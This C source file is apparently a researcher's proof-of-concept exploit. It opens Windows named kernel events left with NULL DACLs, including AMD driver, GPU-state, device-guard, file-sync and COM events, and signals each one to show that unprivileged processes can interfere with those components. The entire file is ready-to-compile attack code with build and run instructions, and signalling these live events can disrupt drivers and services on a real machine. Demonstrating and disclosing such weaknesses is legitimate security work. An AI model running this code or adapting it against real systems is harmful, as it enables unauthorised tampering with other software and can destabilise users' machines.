/* PoC 4b — Object Manipulation Demo
 * Opens a NULL_DACL kernel object discovered by poc4.exe
 * and proves cross-component interference is possible.
 * Garrett Stimpson, 2026-07-25
 *
 * Build: x86_64-w64-mingw32-gcc -O2 poc4_manipulate.c -o poc4_manipulate.exe -lntdll
 * Run:   poc4_manipulate.exe
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/* NT API declarations */
typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

#define OBJ_CASE_INSENSITIVE 0x00000040L
#define EVENT_MODIFY_STATE   0x0002
#define SYNCHRONIZE          0x00100000L

typedef NTSTATUS (NTAPI *pNtOpenEvent)(PHANDLE, ACCESS_MASK, struct _OBJECT_ATTRIBUTES*);
typedef VOID    (NTAPI *pRtlInitUnicodeString)(UNICODE_STRING*, PCWSTR);

static pNtOpenEvent         _NtOpenEvent = NULL;
static pRtlInitUnicodeString _RtlInitUnicodeString = NULL;

#define InitializeObjectAttributes(p,n,a,r,s) \
    do { (p)->Length = sizeof(OBJECT_ATTRIBUTES); (p)->RootDirectory = (r); \
         (p)->Attributes = (a); (p)->ObjectName = (n); \
         (p)->SecurityDescriptor = (s); \
         (p)->SecurityQualityOfService = NULL; } while(0)

static int load_nt(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;
    _NtOpenEvent = (pNtOpenEvent)GetProcAddress(ntdll, "NtOpenEvent");
    _RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    return _NtOpenEvent && _RtlInitUnicodeString;
}

/* Targets discovered by poc4.exe — all have NULL DACL in session 9 */
static const wchar_t *targets[] = {
    L"\\BaseNamedObjects\\CCCRuntimeReady",      /* COM event */
    L"\\BaseNamedObjects\\FSyncClientUpdateEvent", /* File sync event */
    L"\\BaseNamedObjects\\AMDDriverShowTrayIcon_0", /* AMD driver */
    L"\\BaseNamedObjects\\AMDDgSafeRemove_0",      /* AMD device guard */
    L"\\BaseNamedObjects\\AMDSMI_0",               /* AMD SMI */
    L"\\BaseNamedObjects\\AMDGpuStopped_0",        /* AMD GPU state */
    L"\\BaseNamedObjects\\Nvy8dhamHYs5sWt",        /* Unknown, random name */
    NULL
};

int main(void) {
    printf("PoC 4b — NULL-DACL Object Manipulation Demo\n");
    printf("Garrett Stimpson, 2026-07-25\n");
    printf("Proves that NULL-DACL kernel objects are trivially manipulable\n\n");

    if (!load_nt()) {
        fprintf(stderr, "FATAL: cannot load NT API\n");
        return 1;
    }

    int opened = 0, failed = 0;

    for (int i = 0; targets[i]; i++) {
        UNICODE_STRING us;
        _RtlInitUnicodeString(&us, targets[i]);

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE h = NULL;
        /* Try with EVENT_MODIFY_STATE — minimal rights to call SetEvent */
        NTSTATUS st = _NtOpenEvent(&h, EVENT_MODIFY_STATE, &oa);
        if (st == 0 && h) {
            if (SetEvent(h)) {
                printf("  [OPENED + SIGNALED] %S\n", targets[i]);
                opened++;
            } else {
                printf("  [OPENED, signal failed %lu] %S\n", GetLastError(), targets[i]);
            }
            CloseHandle(h);
        } else {
            printf("  [FAILED 0x%08lx] %S\n", (unsigned long)st, targets[i]);
            failed++;
        }
    }

    printf("\n──────────────────────────────────────────────\n");
    printf("RESULT: %d opened & signaled, %d failed\n", opened, failed);
    if (opened > 0) {
        printf("\nVERDICT: NULL-DACL kernel objects ARE trivially manipulable\n");
        printf("by any unprivileged process in the same session.\n");
        printf("This is a cross-component interference vector.\n");
    }

    return failed > 0 ? 1 : 0;
}
